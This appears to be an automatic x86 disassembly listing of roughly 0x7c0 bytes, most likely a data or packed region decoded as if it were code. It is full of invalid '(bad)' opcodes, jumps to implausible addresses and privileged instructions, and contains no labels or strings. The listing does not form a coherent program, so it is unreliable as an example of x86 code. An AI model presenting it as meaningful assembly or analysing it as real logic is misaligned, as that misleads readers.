  4386a6:	jmp    0xe5dd393e
  4386ab:	mov    al,ds:0x1960c597
  4386b0:	and    cl,BYTE PTR [esi]
  4386b2:	jmp    0x7dcfc04a
  4386b7:	xchg   ebx,eax
  4386b8:	mov    dl,0xe
  4386ba:	push   eax
  4386bb:	mov    dh,0xbc
  4386bd:	jmp    0x1960:0x27b61e56
  4386c4:	sbb    cl,BYTE PTR [esi]
  4386c6:	jmp    0x401e605e
  4386cb:	adc    BYTE PTR [ebx+0x63c4983c],bh
  4386d1:	inc    esp
  4386d2:	xchg   esi,eax
  4386d3:	adc    al,0xc9
  4386d5:	xchg   esi,eax
  4386d6:	scas   al,BYTE PTR es:[edi]
  4386d7:	add    BYTE PTR [eax],al
  4386d9:	add    BYTE PTR [eax],al
  4386db:	add    bl,al
  4386dd:	ret    0xf94d
  4386e0:	mov    eax,DWORD PTR [esi+0x13]
  4386e3:	adc    DWORD PTR [ecx+ebx*8-0x4d6c14fb],0xffffff97
  4386eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4386ec:	ja     0x438680
  4386ee:	aas    
  4386ef:	(bad)  
  4386f0:	mov    esi,0xca012e94
  4386f5:	enter  0xeeea,0xd
  4386f9:	repnz gs hlt 
  4386fc:	or     ch,BYTE PTR [esi+0x32]
  4386ff:	add    eax,0xa91fc105
  438704:	std    
  438705:	enter  0xe90c,0x93
  438709:	xor    eax,0xb6dd00a3
  43870e:	push   cs
  43870f:	add    ah,ch
  438711:	dec    eax
  438712:	push   0x8637f258
  438717:	add    BYTE PTR [ecx-0x4c],bh
  43871a:	and    esi,ebx
  43871c:	data16 lock stc 
  43871f:	add    ebp,esi
  438721:	es push cs
  438723:	add    BYTE PTR [ecx],bh
  438725:	out    0x5a,al
  438727:	call   FWORD PTR [ebp+0x5cff328a]
  43872d:	loopne 0x43872b
  43872f:	aas    
  438730:	sub    DWORD PTR ds:0x34e92452,ebp
  438736:	ror    BYTE PTR [eax+esi*4],cl
  438739:	xchg   BYTE PTR [ecx+0xeb69d87],dl
  43873f:	add    BYTE PTR [eax],al
  438741:	add    BYTE PTR [eax],al
  438743:	add    BYTE PTR [eax],al
  438745:	jb     0x43878d
  438747:	pop    edi
  438748:	sbb    BYTE PTR [edx+0x7d9f935b],ch
  43874e:	mov    dh,0xe
  438750:	add    BYTE PTR [eax-0x16ff65e1],dl
  438756:	mov    bl,0x5f
  438758:	scas   eax,DWORD PTR es:[edi]
  438759:	jmp    0xeb6:0x11e94e73
  438760:	add    al,ch
  438762:	or     BYTE PTR [esi+0x0],bh
  438765:	jmp    0x3109b91d
  43876a:	aaa    
  43876b:	add    BYTE PTR [eax],0xb9
  43876e:	mov    bl,0xf1
  438770:	xchg   edi,eax
  438771:	sub    al,BYTE PTR [eax-0x1b]
  438774:	jne    0x438736
  438776:	sub    al,0x52
  438778:	and    al,0xdd
  43877a:	xor    al,0x2e
  43877c:	add    BYTE PTR [edx+0x70db395c],dl
  438782:	pop    ds
  438783:	xchg   BYTE PTR [eax],al
  438785:	test   eax,0x90235fb3
  43878a:	jno    0x43879e
  43878c:	and    BYTE PTR [eax-0x3a074037],dl
  438792:	mov    eax,ds:0x90448f
  438797:	push   es
  438798:	js     0x43871c
  43879a:	mov    DWORD PTR [edx],edx
  43879c:	xchg   DWORD PTR [edi],ecx
  43879e:	popa   
  43879f:	lldt   WORD PTR [eax-0x708cb0b2]
  4387a6:	mov    ds:0xe716,eax
  4387ab:	add    BYTE PTR [eax],al
  4387ad:	add    ah,ch
  4387af:	retf   0xe
  4387b2:	sbb    ecx,DWORD PTR [eax-0x75]
  4387b5:	add    BYTE PTR [eax-0x49316a37],dl
  4387bb:	fist   DWORD PTR [edi+0xec8f081]
  4387c1:	add    BYTE PTR [ebx],bl
  4387c3:	add    BYTE PTR [edi+0xfc99000],0xe8
  4387ca:	imul   edi,DWORD PTR [ecx+0x78],0x3a
  4387ce:	sbb    edx,DWORD PTR ds:0xc9782833
  4387d4:	add    BYTE PTR cs:[eax+0x3ff91244],dl
  4387db:	push   ecx
  4387dc:	lldt   WORD PTR [eax+0x1b03bf88]
  4387e3:	cdq    
  4387e4:	xchg   esi,eax
  4387e5:	into   
  4387e6:	pop    DWORD PTR [ecx+0x2f]
  4387e9:	call   edi
  4387eb:	enter  0xa997,0x28
  4387ef:	leave  
  4387f0:	push   cs
  4387f1:	add    BYTE PTR [ebx-0x7031696e],al
  4387f7:	pop    esi
  4387f8:	push   edx
  4387f9:	xchg   DWORD PTR [edi],edx
  4387fb:	imul   ecx,DWORD PTR [edi],0x84529000
  438801:	pushf  
  438802:	nop
  438803:	leave  
  438804:	push   cs
  438805:	inc    edi
  438806:	or     DWORD PTR [edx-0x4d6f679c],esi
  43880c:	cmc    
  43880d:	mov    ss,esp
  43880f:	xchg   esi,eax
  438810:	call   0x4388e8
  438815:	add    BYTE PTR [eax],al
  438817:	aad    0x67
  438819:	jo     0x438868
  43881b:	push   0x797dac00
  438820:	sub    ah,BYTE PTR [ebp-0x36691b75]
  438826:	xchg   BYTE PTR [edx+0x3b],ah
  438829:	je     0x4387b4
  43882b:	leave  
  43882c:	bound  ecx,QWORD PTR [ebx-0x355783d]
  438832:	xchg   BYTE PTR [edx],cl
  438834:	mov    ebp,0x5477d83
  438839:	push   ebp
  43883a:	add    al,0x90
  43883c:	mov    dl,0x60
  43883e:	(bad)  
  43883f:	lock mov dl,0xf5
  438842:	add    esp,DWORD PTR [ebp+0x2d]
  438845:	inc    ecx
  438846:	add    al,0x90
  438848:	mov    dl,0xf9
  43884a:	movhps QWORD PTR [esi],xmm3
  43884d:	xchg   ecx,eax
  43884e:	add    al,0x90
  438850:	mov    dl,0x5e
  438852:	popf   
  438853:	xor    BYTE PTR [ebx+0x470903f5],dh
  438859:	adc    DWORD PTR [edx*1-0x4c07ac12],esp
  438860:	xchg   edx,eax
  438861:	cmp    eax,0x23bde27f
  438866:	mov    eax,ebx
  438868:	aaa    
  438869:	cs sti 
  43886b:	pop    eax
  43886c:	xor    DWORD PTR [eax+ebx*4-0x70],esi
  438870:	mov    dl,0xf5
  438872:	jl     0x4388b8
  438874:	dec    ecx
  438875:	mov    ebp,0xcca173df
  43887a:	xchg   DWORD PTR [eax],eax
  43887c:	add    BYTE PTR [eax],al
  43887e:	add    BYTE PTR [eax],al
  438880:	xchg   DWORD PTR [ebp-0x3aec82ed],edi
  438886:	sti    
  438887:	lea    edi,[edi-0x43]
  43888a:	or     eax,0x523724f6
  43888f:	lds    esi,FWORD PTR [ebx-0x79]
  438892:	push   edx
  438893:	or     eax,0xd95aab78
  438898:	gs pusha 
  43889a:	jmp    0x4388f9
  43889c:	mov    eax,0x5ff4eb96
  4388a1:	mov    ds:0xba8e94e,eax
  4388a6:	xchg   cl,ch
  4388a8:	xchg   ebx,eax
  4388a9:	mov    dl,0x97
  4388ab:	sub    eax,0xa73792b8
  4388b0:	or     dh,BYTE PTR [ebx]
  4388b2:	sub    cl,0x93
  4388b5:	mov    dl,0x97
  4388b7:	and    eax,0x870f8278
  4388bc:	sbb    cl,BYTE PTR [ebx]
  4388be:	jle    0x4388a9
  4388c0:	xchg   ebx,eax
  4388c1:	mov    dl,0x8f
  4388c3:	lods   eax,DWORD PTR ds:[esi]
  4388c4:	xchg   DWORD PTR ds:0x2e0cc01e,esi
  4388ca:	push   cs
  4388cb:	jmp    0xb042ca63
  4388d0:	cld    
  4388d1:	and    eax,0x4193e90e
  4388d6:	pop    ss
  4388d7:	and    BYTE PTR ds:0x93e90e1e,ch
  4388dd:	inc    ecx
  4388de:	bndldx bnd3,[ecx+0x7f]
  4388e2:	xchg   edi,eax
  4388e3:	sub    al,BYTE PTR [eax]
  4388e5:	add    BYTE PTR [eax],al
  4388e7:	add    BYTE PTR [eax],al
  4388e9:	push   0xb7a59781
  4388ee:	xchg   esi,eax
  4388ef:	xchg   ebp,eax
  4388f0:	sar    DWORD PTR [edx+0x44],1
  4388f3:	in     al,dx
  4388f4:	cs pop esp
  4388f6:	jp     0x438942
  4388f8:	int    0x80
  4388fa:	inc    esi
  4388fb:	add    al,0x64
  4388fd:	inc    ebp
  4388fe:	cmp    BYTE PTR [eax],al
  438900:	ret    0x19f4
  438903:	push   cs
  438904:	jmp    0xe6be9c
  438909:	push   ebp
  43890a:	mov    cl,0xe
  43890c:	add    BYTE PTR [eax],ah
  43890e:	push   cs
  43890f:	jle    0x438911
  438911:	mov    ecx,0xd54491b0
  438916:	xchg   esp,eax
  438917:	xchg   ebx,eax
  438918:	or     al,al
  43891a:	mov    bl,0xe8
  43891c:	jmp    FWORD PTR [esi-0x33]
  43891f:	call   0x481c477b
  438924:	pop    ebx
  438925:	rcr    ch,0xa8
  438928:	adc    BYTE PTR [ecx-0x1e],ch
  43892b:	in     eax,0x74
  43892d:	xchg   ebp,eax
  43892e:	scas   al,BYTE PTR es:[edi]
  43892f:	xchg   ecx,eax
  438930:	icebp  
  438931:	push   ecx
  438932:	mov    bh,0x9e
  438934:	jmp    FWORD PTR [esi]
  438936:	iret   
  438937:	jmp    0x994e:0x97b06900
  43893e:	outs   dx,DWORD PTR ds:[esi]
  43893f:	adc    BYTE PTR [eax-0x29],ah
  438942:	imul   dl
  438944:	out    0xee,eax
  438946:	mov    cl,0xe5
  438948:	jmp    DWORD PTR [ecx+0xfffeb6]
  43894e:	add    BYTE PTR [eax],al
  438950:	add    BYTE PTR [eax],al
  438952:	cmp    DWORD PTR [ebx],ebp
  438954:	pop    eax
  438955:	jo     0x438968
  438957:	ud0    ebp,DWORD PTR gs:[esi+0x1d24522b]
  43895f:	xor    BYTE PTR [eax+0xeaff984],dh
  438965:	(bad)  
  438966:	stos   BYTE PTR es:[edi],al
  438967:	ins    DWORD PTR es:[edi],dx
  438968:	xchg   ebx,eax
  438969:	inc    esi
  43896a:	cmp    DWORD PTR ds:0xe8800850,ebp
  438970:	mov    DWORD PTR ds:[edi],edi
  438973:	fcom   DWORD PTR [ebx-0x67d102b2]
  438979:	sub    cl,0xaf
  43897c:	push   cs
  43897d:	mov    DWORD PTR [edi+0x2e],ebx
  438980:	push   cs
  438981:	add    BYTE PTR [ecx-0x6f736f90],bh
  438987:	leave  
  438988:	push   cs
  438989:	add    BYTE PTR [ecx+0x9000ec9],dl
  43898f:	inc    esp
  438990:	add    BYTE PTR [eax],0x90
  438993:	leave  
  438994:	cdq    
  438995:	mov    bh,ah
  438997:	leave  
  438998:	push   cs
  438999:	add    BYTE PTR [ebx-0x76],ch
  43899c:	fimul  WORD PTR [eax]
  43899e:	dec    eax
  43899f:	pop    esi
  4389a0:	add    al,0x87
  4389a2:	push   ds
  4389a3:	cmp    eax,0x5290000f
  4389a8:	xchg   ebp,eax
  4389a9:	mov    al,ds:0x870ec990
  4389ae:	push   es
  4389af:	push   ecx
  4389b0:	lldt   WORD PTR [eax+0xa49542]
  4389b7:	add    BYTE PTR [eax],al
  4389b9:	add    BYTE PTR [eax],al
  4389bb:	nop
  4389bc:	leave  
  4389bd:	push   cs
  4389be:	test   DWORD PTR [esi-0x55],edx
  4389c1:	push   esp
  4389c2:	or     BYTE PTR [eax+0x38ef9b7b],dl
  4389c8:	lds    ecx,FWORD PTR [esi]
  4389ca:	add    BYTE PTR [eax-0x77dc54e5],dl
  4389d0:	retf   0xfa
  4389d3:	or     eax,DWORD PTR [ebx]
  4389d5:	ja     0x4389c2
  4389d7:	push   0x3c
  4389d9:	push   0x54a34e85
  4389de:	add    al,0x90
  4389e0:	mov    ds:0x30bef9b,eax
  4389e5:	fcmovnb st,st(0)
  4389e7:	xchg   esi,eax
  4389e8:	jmp    0x71d3ca99
  4389ed:	cmp    eax,0x946bff36
  4389f2:	jp     0x43897c
  4389f4:	retf   0x4dd
  4389f7:	sbb    ecx,DWORD PTR [ebx-0x79]
  4389fa:	add    BYTE PTR [eax-0x653c8937],dl
  438a00:	mov    WORD PTR [eax-0x7b],gs
  438a03:	inc    esi
  438a04:	mov    dl,0x85
  438a06:	imul   ecx,DWORD PTR [ebx],0x78
  438a09:	or     al,0x7a
  438a0b:	or     eax,0x36b956c
  438a10:	js     0x438a2e
  438a12:	jp     0x4389e5
  438a14:	mov    bl,0x71
  438a16:	lahf   
  438a17:	push   eax
  438a18:	mov    dl,0x8b
  438a1a:	inc    esi
  438a1b:	inc    ebx
  438a1c:	fs jo  0x438a93
  438a1f:	add    BYTE PTR [eax],al
  438a21:	add    BYTE PTR [eax],al
  438a23:	add    BYTE PTR [edx-0x6ffc8ecd],ah
  438a29:	mov    dl,0xf6
  438a2b:	out    dx,eax
  438a2c:	xchg   edx,eax
  438a2d:	sub    eax,0xb56ce033
  438a32:	or     BYTE PTR [ebp+edi*8-0x8],al
  438a36:	ins    BYTE PTR es:[edi],dx
  438a37:	add    al,0x90
  438a39:	mov    dl,0xf7
  438a3b:	out    dx,al
  438a3c:	xchg   edx,eax
  438a3d:	sub    eax,0xb56cf03b
  438a42:	call   0xf6ca9591
  438a47:	jle    0x438ab4
  438a49:	inc    eax
  438a4a:	loop   0x438a1a
  438a4c:	loop   0x438a7b
  438a4e:	mov    ebx,0xf5b2bc6c
  438a53:	add    eax,DWORD PTR [eax]
  438a55:	mov    ah,0x90
  438a57:	out    0xe0,eax
  438a59:	sub    eax,0x7cc26ca2
  438a5e:	ins    BYTE PTR es:[edi],dx
  438a5f:	jns    0x438a6e
  438a61:	mov    ebx,0xaea37979
  438a66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438a67:	inc    ebx
  438a68:	sub    eax,0x14824b5d
  438a6d:	mov    bl,0xf5
  438a6f:	add    eax,DWORD PTR [edi]
  438a71:	inc    esi
  438a72:	jmp    0x4389f8
  438a74:	jp     0x438ac4
  438a76:	cmc    
  438a77:	icebp  
  438a78:	xchg   DWORD PTR [ecx+0x40e8dfaa],edi
  438a7e:	aad    0xd0
  438a80:	call   0x81d89924
  438a85:	jb     0x438a95
  438a87:	push   0x0
  438a89:	add    BYTE PTR [eax],al
  438a8b:	add    BYTE PTR [eax],al
  438a8d:	push   eax
  438a8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438a8f:	(bad)  
  438a90:	addr16 sbb al,0xb3
  438a93:	push   cs
  438a94:	jmp    0x6a4ad026
  438a99:	mov    edx,0x86970e45
  438a9e:	mov    ebx,0x751c7d63
  438aa3:	jb     0x438aa3
  438aa5:	mov    eax,ds:0xc42e0f49
  438aaa:	mov    edx,0x72818d00
  438aaf:	push   cs
  438ab0:	push   0xffffffcf
  438ab2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438ab3:	inc    ecx
  438ab4:	ss adc eax,0x93fbf5ec
  438aba:	mov    dl,0xe
  438abc:	push   0x71
  438abe:	push   ebp
  438abf:	push   cs
  438ac0:	je     0x438b1b
  438ac2:	dec    ecx
  438ac3:	mul    BYTE PTR [ebp+0x66]
  438ac6:	mov    edx,0x5b9279ea
  438acb:	dec    esp
  438acc:	or     al,0xcd
  438ace:	fs xchg edi,eax
  438ad0:	cwde   
  438ad1:	sbb    al,0x6c
  438ad3:	inc    edx
  438ad4:	xchg   ecx,eax
  438ad5:	lds    eax,FWORD PTR [ecx+0x6e0c96eb]
  438adb:	xor    ah,cl
  438add:	or     al,0x54
  438adf:	dec    edx
  438ae0:	jmp    0x7285feff
  438ae5:	out    0x94,eax
  438ae7:	sbb    ah,BYTE PTR [eax+0x51]
  438aea:	popa   
  438aeb:	dec    esp
  438aec:	stos   DWORD PTR es:[edi],eax
  438aed:	mov    esi,DWORD PTR [edx+0xb897]
  438af3:	add    BYTE PTR [eax],al
  438af5:	add    bl,ch
  438af7:	lea    edi,ds:0x1fb4f6bd
  438afd:	sub    DWORD PTR [esi+edx*4+0x44],ebp
  438b01:	(bad)  
  438b02:	out    0x94,eax
  438b04:	push   ss
  438b05:	add    BYTE PTR [ebx+eax*2+0x62],bh
  438b09:	or     BYTE PTR [edx-0xc],ah
  438b0c:	add    ebp,DWORD PTR ds:[eax]
  438b0f:	loope  0x438aa4
  438b11:	push   es
  438b12:	popa   
  438b13:	mov    ch,0x2e
  438b15:	add    BYTE PTR [ecx-0x4f0418b],bh
  438b1b:	outs   dx,BYTE PTR ds:[esi]
  438b1c:	dec    eax
  438b1d:	ret    0xb4ad
  438b20:	xchg   ecx,eax
  438b21:	inc    esp
  438b22:	int    0xb8
  438b24:	jmp    0x438b66
  438b26:	cmc    
  438b27:	and    eax,0xf3d25c2b
  438b2c:	inc    edx
  438b2d:	jb     0x438adf
  438b2f:	(bad)  
  438b30:	jmp    0x76ff:0x8a4ca969
  438b37:	inc    eax
  438b38:	lods   al,BYTE PTR ds:[esi]
  438b39:	add    al,0x79
  438b3b:	jecxz  0x438ace
  438b3d:	in     al,dx
  438b3e:	mov    eax,0x69086333
  438b43:	inc    ecx
  438b44:	pop    edi
  438b45:	adc    dl,ah
  438b47:	icebp  
  438b48:	push   ss
  438b49:	push   eax
  438b4a:	es jg  0x438b32
  438b4d:	jne    0x438bc0
  438b4f:	ret    
  438b50:	or     eax,0xe53cc9e8
  438b55:	jmp    DWORD PTR [edx]
  438b57:	mov    dl,0xf6
  438b59:	mov    al,0x0
  438b5b:	add    BYTE PTR [eax],al
  438b5d:	add    BYTE PTR [eax],al
  438b5f:	repnz aas 
  438b61:	in     eax,0x59
  438b63:	test   BYTE PTR [edx+ebx*1+0x0],dh
  438b67:	jg     0x438b94
  438b69:	sti    
  438b6a:	sbb    DWORD PTR [edi+0x778cead2],0xffffffbe
  438b71:	repnz loope 0x438ba1
  438b74:	inc    ecx
  438b75:	in     eax,0x8a
  438b77:	scas   eax,DWORD PTR es:[edi]
  438b78:	xor    cl,BYTE PTR [esi]
  438b7a:	add    cl,bh
  438b7c:	adc    DWORD PTR [edx+0x24],0x80b03501
  438b83:	nop
  438b84:	leave  
  438b85:	push   cs
  438b86:	add    BYTE PTR [eax-0x6f5b9398],dl
  438b8c:	leave  
  438b8d:	push   cs
  438b8e:	and    al,0x91
  438b90:	mov    ecx,0xc9908468
  438b95:	push   cs
  438b96:	test   DWORD PTR [ebp+ebp*4+0x16],ecx
  438b9a:	rcl    DWORD PTR [esi],0x3e
  438b9d:	adc    al,BYTE PTR [eax]
  438b9f:	nop
  438ba0:	retf   0xe
  438ba3:	nop
  438ba4:	push   edx
  438ba5:	ins    BYTE PTR es:[edi],dx
  438ba6:	mov    BYTE PTR [eax-0x2da5f137],dl
  438bac:	ror    DWORD PTR [esi],0x7d
  438baf:	mov    ah,0xd1
  438bb1:	mov    edi,0x98184652
  438bb6:	jl     0x438c24
  438bb8:	stc    
  438bb9:	xchg   edi,eax
  438bba:	out    dx,al
  438bbb:	adc    edx,DWORD PTR [eax+0xe]
  438bbe:	add    BYTE PTR [ebx],bl
  438bc0:	loop   0x438b9f
  438bc2:	add    BYTE PTR [eax],al
  438bc4:	add    BYTE PTR [eax],al
  438bc6:	add    BYTE PTR [eax],al
  438bc8:	inc    eax
  438bc9:	retf   0xc179
  438bcc:	xchg   ecx,eax
  438bcd:	leave  
  438bce:	push   cs
  438bcf:	cmp    DWORD PTR [ebp-0x40],0x6a
  438bd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438bd4:	xchg   ecx,eax
  438bd5:	leave  
  438bd6:	push   cs
  438bd7:	and    DWORD PTR [esi-0x30],0x6a
  438bdb:	popf   
  438bdc:	xchg   ecx,eax
  438bdd:	leave  
  438bde:	push   cs
  438bdf:	jge    0x438c2f
  438be1:	rcr    ebp,0x23
  438be4:	mov    edx,0x745495c8
  438be9:	jmp    0xae0a73b7
  438bee:	arpl   cx,di
  438bf0:	sbb    eax,0xbe1c2e85
  438bf5:	sahf   
  438bf6:	ret    0x85f8
  438bf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438bfa:	sbb    al,0x40
  438bfc:	nop
  438bfd:	dec    esp
  438bfe:	sub    ecx,DWORD PTR [edx*1+0xc0635b2]
  438c05:	cmp    al,0xf6
  438c07:	add    edx,DWORD PTR [eax-0x6c16df7d]
  438c0d:	sub    DWORD PTR [ecx-0x4ed64fe1],edi
  438c13:	pop    ds
  438c14:	lods   al,BYTE PTR ds:[esi]
  438c15:	pop    edx
  438c16:	js     0x438c8d
  438c18:	xchg   ecx,eax
  438c19:	cmp    eax,0x2587ea0d
  438c1e:	sbb    DWORD PTR [edi],0x1afd59a8
  438c24:	sub    al,0xb7
  438c26:	or     ecx,DWORD PTR [eax-0x321671ac]
  438c2c:	add    BYTE PTR [eax],al
  438c2e:	add    BYTE PTR [eax],al
  438c30:	add    BYTE PTR [edx+0x62],ah
  438c33:	sbb    al,0x10
  438c35:	xor    al,0xa0
  438c37:	mov    ch,0x3
  438c39:	and    eax,0xd080f8ee
  438c3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438c3f:	jp     0x438c6f
  438c41:	xchg   edi,eax
  438c42:	mov    dh,0xf4
  438c44:	mov    cl,BYTE PTR [ebp-0x36]
  438c47:	push   ds
  438c48:	cmp    DWORD PTR [eax-0x71161cc0],eax
  438c4e:	daa    
  438c4f:	sub    DWORD PTR [eax],esp
  438c51:	cwde   
  438c52:	pop    ebx
  438c53:	int    0x68
  438c55:	int    0xb5
  438c57:	shr    edx,cl
  438c59:	xchg   ebx,eax
  438c5a:	pop    edx
  438c5b:	add    eax,0xbd8ed487
  438c60:	push   0xfebb317e
  438c65:	cwde   
  438c66:	das    
  438c67:	in     eax,0x2
  438c69:	nop
  438c6a:	mov    dl,0xff
  438c6c:	adc    DWORD PTR [ebx],ecx
  438c6e:	pop    edi
  438c6f:	fstp   DWORD PTR [ebx]
  438c71:	(bad)  
  438c73:	mov    ecx,esp
  438c75:	sub    BYTE PTR [esi-0x618c3f9f],dh
  438c7b:	add    ecx,edi
  438c7d:	iret   
  438c7e:	mov    ch,0xd
  438c80:	fdiv   QWORD PTR [edi]
  438c82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438c83:	dec    esi
  438c84:	jmp    0x6c5d7b99
  438c89:	dec    esp
  438c8a:	stos   DWORD PTR es:[edi],eax
  438c8b:	xchg   ecx,eax
  438c8c:	dec    ebp
  438c8d:	xchg   esp,eax
  438c8e:	mov    dl,0xe
  438c90:	ret    
  438c91:	xchg   ecx,eax
  438c92:	pop    edx
  438c93:	ds pop esp
  438c95:	add    BYTE PTR [eax],al
  438c97:	add    BYTE PTR [eax],al
  438c99:	add    al,bl
  438c9b:	xchg   ecx,eax
  438c9c:	cs add eax,ecx
  438c9f:	xchg   ecx,eax
  438ca0:	push   ds
  438ca1:	mov    ch,0x8a
  438ca3:	dec    esp
  438ca4:	or     eax,0xec35ad41
  438ca9:	cmp    DWORD PTR cs:[ecx-0x46ec880a],esi
  438cb0:	jmp    0x8c21:0x92ab5465
  438cb7:	mov    dl,0xe
  438cb9:	bound  ebp,QWORD PTR [ebp-0x15129cd2]
  438cbf:	mov    dl,0x2e
  438cc1:	jmp    0xcd95ba59
  438cc6:	arpl   dx,cx
  438cc8:	sbb    BYTE PTR [ecx-0x2e6943fc],dh
  438cce:	push   es
  438ccf:	retf   0x651a
  438cd2:	sub    BYTE PTR [edx+0x3608e90e],dh
  438cd8:	xor    ch,ch
  438cda:	mov    al,ds:0x5f694edf
  438cdf:	xchg   ecx,eax
  438ce0:	cmp    ch,cl
  438ce2:	or     BYTE PTR [esi+0x32],ch
  438ce5:	stc    
  438ce6:	or     al,BYTE PTR [ebx+0x12]
  438ce9:	pusha  
  438cea:	xor    al,0xa9
  438cec:	shr    DWORD PTR [esi],cl
  438cee:	pushf  
  438cef:	mov    dl,0x2e
  438cf1:	jmp    0x1d56ba89
  438cf6:	push   0x4c
  438cf8:	adc    bl,dl
  438cfa:	rcr    DWORD PTR [ebp-0x6f],cl
  438cfd:	add    BYTE PTR [eax],al
  438cff:	add    BYTE PTR [eax],al
  438d01:	add    BYTE PTR [eax],al
  438d03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438d04:	scas   al,BYTE PTR es:[edi]
  438d05:	push   edx
  438d06:	sar    DWORD PTR [ecx-0x19],0xf2
  438d0a:	in     eax,dx
  438d0b:	outs   dx,BYTE PTR ds:[esi]
  438d0c:	scas   al,BYTE PTR es:[edi]
  438d0d:	push   cs
  438d0e:	mov    esp,esi
  438d10:	sub    DWORD PTR [ebp+0x4],edx
  438d13:	add    BYTE PTR [ecx-0x5a],0x0
  438d17:	mov    DWORD PTR [esi-0x5ed9d4f2],ebp
  438d1d:	xchg   ebx,eax
  438d1e:	push   esp
  438d1f:	xchg   ebp,eax
  438d20:	jle    0x438cb5
  438d22:	dec    esp
  438d23:	xchg   ebp,eax
  438d24:	mov    ds:0xb2c329f1,al
  438d29:	cmp    eax,0xeadbfde8
  438d2e:	push   DWORD PTR [edx]
  438d30:	out    dx,al
  438d31:	push   cs
  438d32:	mov    ebp,DWORD PTR [ecx-0xa76f2d6]
  438d38:	xchg   esp,eax
  438d39:	push   ds
  438d3a:	mov    eax,0xe90a9
  438d3f:	shl    ch,cl
  438d41:	sbb    cl,BYTE PTR [ecx-0x7afd6b23]
  438d47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438d48:	(bad)  
  438d49:	adc    BYTE PTR [ebp-0x74ef3b90],al
  438d4f:	mov    dh,BYTE PTR [esi]
  438d51:	loopne 0x438dc7
  438d53:	jne    0x438cda
  438d55:	stc    
  438d56:	jne    0x438ce2
  438d58:	sub    esi,ecx
  438d5a:	je     0x438dca
  438d5c:	xor    eax,0xde85245a
  438d61:	aas    
  438d62:	call   0x2939f3
  438d67:	add    BYTE PTR [eax],al
  438d69:	add    BYTE PTR [eax],al
  438d6b:	add    ah,dh
  438d6d:	outs   dx,BYTE PTR ds:[esi]
  438d6e:	bound  ecx,QWORD PTR ds:0xc623d62
  438d74:	mov    dl,0xba
  438d76:	cs adc al,0x20
  438d79:	aam    0xe5
  438d7b:	call   FWORD PTR [esi]
  438d7d:	aad    0xe6
  438d7f:	pop    esi
  438d80:	nop
  438d81:	push   eax
  438d82:	dec    ebp
  438d83:	call   0xf9a36a2c
  438d88:	imul   edi,DWORD PTR [eax],0xf
  438d8b:	xchg   esp,eax
  438d8c:	push   ebx
  438d8d:	inc    edi
  438d8e:	into   
  438d8f:	and    esi,DWORD PTR [ecx+esi*1+0x0]
  438d93:	or     BYTE PTR [esi],0x45
  438d96:	ins    BYTE PTR es:[edi],dx
  438d97:	mov    ebp,0x715fb5fb
  438d9c:	xchg   esp,eax
  438d9d:	inc    eax
  438d9e:	into   
  438d9f:	and    edi,DWORD PTR [eax-0x6d17d8a4]
  438da5:	(bad)  
  438da6:	pop    edi
  438da7:	stc    
  438da8:	fist   WORD PTR [ecx-0x6e183fe5]
  438dae:	mov    edi,0x94203559
  438db3:	les    ebp,FWORD PTR [eax+0x5e000e87]
  438db9:	inc    eax
  438dba:	popa   
  438dbb:	mov    edx,DWORD PTR [esi-0x3b]
  438dbe:	mov    esi,0x4459df8
  438dc3:	inc    eax
  438dc4:	nop
  438dc5:	fmul   DWORD PTR [esi-0x79]
  438dc8:	mov    es,WORD PTR [edx-0x28]
  438dcb:	add    ecx,DWORD PTR [ecx]
  438dcd:	or     al,0xe7
  438dcf:	test   BYTE PTR [eax],al
  438dd1:	add    BYTE PTR [eax],al
  438dd3:	add    BYTE PTR [eax],al
  438dd5:	into   
  438dd6:	sbb    edx,DWORD PTR [edx+edx*2-0x19]
  438dda:	push   eax
  438ddb:	popa   
  438ddc:	sub    eax,0x72209287
  438de1:	mov    eax,ds:0x7703d540
  438de6:	xchg   ebp,eax
  438de7:	mov    edx,0x46985f9
  438dec:	inc    eax
  438ded:	nop
  438dee:	test   BYTE PTR [ebx],bh
  438df0:	cmp    ah,dl
  438df2:	in     al,0x6b
  438df4:	dec    edx
  438df5:	mov    ecx,?
  438df7:	adc    al,0x31
  438df9:	dec    edi
  438dfa:	add    al,0x8e
  438dfc:	inc    edx
  438dfd:	xchg   esp,eax
  438dfe:	mov    dl,0x25
  438e00:	jae    0x438da5
  438e02:	push   cs
  438e03:	out    0xc3,eax
  438e05:	aaa    
  438e06:	push   esp
  438e07:	and    eax,DWORD PTR [edi-0x3d]
  438e0a:	pop    esp
  438e0b:	jo     0x438e81
  438e0d:	sbb    eax,DWORD PTR [ecx+eiz*8-0x28]
  438e11:	sbb    BYTE PTR [ebp-0x4d2fea9b],bl
  438e17:	js     0x438e0a
  438e19:	xchg   edi,eax
  438e1a:	mov    dl,0xe2
  438e1c:	ficom  DWORD PTR [ebx+ebx*2+0x8]
  438e20:	dec    edi
  438e21:	lods   eax,DWORD PTR ds:[esi]
  438e22:	mov    bl,0x2d
  438e24:	adc    al,BYTE PTR [edx-0x6c368f8a]
  438e2a:	das    
  438e2b:	sbb    DWORD PTR [eax+edx*4-0x2021fcc2],ebp
  438e32:	mov    bl,0xe0
  438e34:	stos   DWORD PTR es:[edi],eax
  438e35:	fstp   DWORD PTR [ecx+ecx*8+0x16]
  438e3c:	add    BYTE PTR [eax],al
  438e3e:	push   eax
  438e3f:	mov    dl,0x72
  438e41:	inc    ebx
  438e42:	inc    ebx
  438e43:	popf   
  438e44:	pusha  
  438e45:	leave  
  438e46:	xchg   ebx,eax
  438e47:	mov    bl,0xc0
  438e49:	stos   DWORD PTR es:[edi],eax
  438e4a:	mov    ecx,0x5015959c
  438e4f:	mov    dl,0x70
  438e51:	leave  
  438e52:	xchg   ebx,eax
  438e53:	das    
  438e54:	fldcw  WORD PTR [ebx+0x7edec790]
  438e5a:	dec    edx
  438e5b:	scas   al,BYTE PTR es:[edi]
  438e5c:	jo     0x438e65
  438e5e:	inc    edi
  438e5f:	cmp    al,0xf4
  438e61:	mov    ebp,es
